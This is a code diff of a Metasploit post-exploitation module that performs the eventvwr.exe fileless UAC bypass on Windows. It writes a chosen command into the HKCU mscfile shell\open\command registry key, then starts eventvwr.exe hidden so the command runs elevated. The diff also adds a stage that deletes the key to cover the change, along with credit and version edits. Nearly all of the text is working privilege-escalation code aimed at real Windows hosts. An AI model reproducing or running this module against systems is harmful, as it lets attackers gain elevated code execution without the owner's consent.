@@ -95,10 +95,10 @@ class MetasploitModule < Msf::Post
                         'Author'        =>
                                 [
                                         'Module Author: pedr0 Ubuntu [r00t-3xp10it]', # post-module author
-                                        'Vuln dicover : enigma0x3 | Matt Graeber', # credits
+                                        'Vuln dicover : enigma0x3 | @mattifestation', # credits
                                 ],
  
-                        'Version'        => '$Revision: 1.1',
+                        'Version'        => '$Revision: 1.2',
                         'DisclosureDate' => 'jan 3 2017',
                         'Platform'       => 'windows',
                         'Arch'           => 'x86_x64',
@@ -148,7 +148,6 @@ def ls_stage1
   exec_comm = datastore['CMD_COMMAND']                         # my cmd command to execute
   comm_path = '%SystemRoot%\\System32\\cmd.exe /c'             # %comspec% path 
   vul_serve = '%SystemRoot%\\System32\\eventvwr.exe'           # vulnerable soft to be hijacked
-  reg_clean = 'REG DELETE HKCU\\Software\\Classes\\mscfile /f' # registry hive to be clean in the end
   regi_hive = 'REG ADD HKCU\\Software\\Classes\\mscfile\\shell\\open\\command' # registry hive key to be hijacked
   comm_inje = "#{regi_hive} /ve /t REG_SZ /d \"#{comm_path} #{exec_comm}\" /f" # injection registry oneliner command
   # check for proper config settings enter
@@ -163,34 +162,36 @@ def ls_stage1
   end
 
 
-    # search in target regedit for registry key existence
-    print_warning("Reading service hive registry keys...")
+    # search in target regedit if eventvwr calls mmc.exe
+    print_warning("Reading proccess registry hive keys...")
     Rex::sleep(1.0)
-    if registry_enumkeys("HKCU\\Software\\Classes")
+    if registry_enumkeys("HKCR\\mscfile\\shell\\open\\command")
       print_good(" Remote registry hive key found!")
       Rex::sleep(1.0)
     else
-       # registry key not found, aborting module execution.
-       print_error("ABORT: post-module cant find the registry key needed...")
+       # registry hive key not found, aborting module execution.
+       print_error("Post-module cant find the registry hive key needed...")
+       print_error("System does not apper to be vuln to the exploit code!")
+       print_line("")
        Rex::sleep(1.0)
        return nil
     end
-
 
  # Execute process hijacking in registry...
  # REG ADD HKCU\Software\Classes\mscfile\shell\open\command /ve /t REG_SZ /d "c:\windows\System32\cmd.exe /c start notepad.exe" /f
  print_good(" Hijacking proccess to gain code execution...")
  r = session.sys.process.execute("cmd.exe /c #{comm_inje}", nil, {'Hidden' => true, 'Channelized' => true})
  # give a proper time to refresh regedit
- Rex::sleep(5.0)
+ Rex::sleep(3.0)
 
       # start remote service to gain code execution
       print_good(" Starting eventvwr.exe native proccess...")
       r = session.sys.process.execute("cmd.exe /c #{vul_serve}", nil, {'Hidden' => true, 'Channelized' => true})
-      print_line("")
       Rex::sleep(1.0)
 
     # close channel when done
+    print_status("Credits: enigma0x3 + @mattifestation")
+    print_line("")
     r.channel.close
     r.close
 
@@ -199,6 +200,60 @@ def ls_stage1
   print_error("Error: #{e.class} #{e}")
 end
 
+
+
+
+# ----------------------------------------------------
+# DELETE MALICIOUS REGISTRY ENTRY (proccess hijacking)
+# ----------------------------------------------------
+def ls_stage2
+
+  r=''
+  session = client
+  reg_clean = 'REG DELETE HKCU\\Software\\Classes\\mscfile /f' # registry hive to be clean
+  # check for proper config settings enter
+  # to prevent 'unset all' from deleting default options...
+  if datastore['DEL_REGKEY'] == 'nil'
+    print_error("Options not configurated correctly...")
+    print_warning("Please set DEL_REGKEY option!")
+    return nil
+  else
+    print_status("Revert eventvwr.exe process hijack!")
+    Rex::sleep(1.5)
+  end
+
+    # search in target regedit if hijacking method allready exists
+    print_warning("Reading proccess registry hive keys...")
+    Rex::sleep(1.0)
+    if registry_enumkeys("HKCU\\Software\\Classes\\mscfile\\shell\\open\\command")
+      print_good(" Remote registry hive key found!")
+      Rex::sleep(1.0)
+    else
+       # registry hive key not found, aborting module execution.
+       print_error("Post-module cant find the registry hive key needed...")
+       print_error("System does not apper to be vuln to the exploit code!")
+       print_line("")
+       Rex::sleep(1.0)
+       return nil
+    end
+
+ # Delete hijacking hive keys from target regedit...
+ # REG DELETE HKCU\Software\Classes\mscfile\shell\open\command /f
+ print_good(" Deleting hive registry keys...")
+ r = session.sys.process.execute("cmd.exe /c #{reg_clean}", nil, {'Hidden' => true, 'Channelized' => true})
+ # give a proper time to refresh regedit
+ Rex::sleep(3.0)
+
+    # close channel when done
+    print_status("registry hijack reverted to default stage")
+    print_line("")
+    r.channel.close
+    r.close
+
+  # error exception funtion
+  rescue ::Exception => e
+  print_error("Error: #{e.class} #{e}")
+end
 
 
 
@@ -219,7 +274,7 @@ def run
 
     # Print banner and scan results on screen
     print_line("    +----------------------------------------------+")
-    print_line("    | enigma fileless uac bypass command execution |")
+    print_line("    | enigma fileless UAC bypass command execution |")
     print_line("    |             Author: r00t-3xp10it             |")
     print_line("    +----------------------------------------------+")
     print_line("")
